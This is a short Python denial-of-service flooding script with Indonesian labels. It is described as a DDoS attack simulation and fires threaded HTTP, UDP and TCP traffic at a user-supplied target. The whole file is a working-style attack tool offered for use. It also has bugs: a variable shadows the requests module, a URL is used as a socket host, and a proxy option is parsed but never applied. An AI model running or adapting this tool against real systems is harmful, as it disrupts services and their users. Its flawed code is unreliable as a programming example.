import requests
import threading
import time
import random
import socket
import argparse

MERAH = "\033[91m"
HIJAU = "\033[92m"
RESET = "\033[0m"

MAX_THREADS = 1000
MAX_REQUESTS = 10000
TIMEOUT = 5

def send_request(url, method, headers, data):
    try:
        if method == "GET":
            response = requests.get(url, headers=headers, timeout=TIMEOUT)
        elif method == "POST":
            response = requests.post(url, headers=headers, data=data, timeout=TIMEOUT)
        print(f"{HIJAU}Request terkirim ke {url}!{RESET}")
    except requests.exceptions.RequestException as e:
        print(f"{MERAH}Gagal mengirim request ke {url}: {e}{RESET}")

def send_udp_packet(url, port, data):
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.sendto(data, (url, port))
        print(f"{HIJAU}Paket UDP terkirim ke {url}:{port}!{RESET}")
    except socket.error as e:
        print(f"{MERAH}Gagal mengirim paket UDP ke {url}:{port}: {e}{RESET}")

def send_tcp_packet(url, port, data):
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.connect((url, port))
        sock.send(data)
        print(f"{HIJAU}Paket TCP terkirim ke {url}:{port}!{RESET}")
    except socket.error as e:
        print(f"{MERAH}Gagal mengirim paket TCP ke {url}:{port}: {e}{RESET}")

def main():
    parser = argparse.ArgumentParser(description="Simulasi Serangan DDOS")
    parser.add_argument("-u", "--url", required=True, help="URL target")
    parser.add_argument("-m", "--method", choices=["GET", "POST"], default="GET", help="Metode request")
    parser.add_argument("-t", "--threads", type=int, default=1, help="Jumlah thread")
    parser.add_argument("-r", "--requests", type=int, default=1, help="Jumlah request")
    parser.add_argument("-p", "--proxy", help="Proxy URL")
    parser.add_argument("-d", "--data", help="Data request")
    args = parser.parse_args()

    url = args.url
    method = args.method
    threads = args.threads
    requests = args.requests
    proxy = args.proxy
    data = args.data

    if proxy:
        proxies = {"http": proxy, "https": proxy}
    else:
        proxies = None

    headers = {"User-Agent": "Mozilla/5.0"}

    threads_list = []
    for i in range(threads):
        t = threading.Thread(target=send_request, args=(url, method, headers, data))
        threads_list.append(t)
        t.start()

    udp_threads_list = []
    for i in range(requests):
        t = threading.Thread(target=send_udp_packet, args=(url, 80, b"DDOS Attack"))
        udp_threads_list.append(t)
        t.start()

    tcp_threads_list = []
    for i in range(requests):
        t = threading.Thread(target=send_tcp_packet, args=(url, 80, b"DDOS Attack"))
        tcp_threads_list.append(t)
        t.start()

    for t in threads_list:
        t.join()
    for t in udp_threads_list:
        t.join()
    for t in tcp_threads_list:
        t.join()

if __name__ == "__main__":
    main()
    
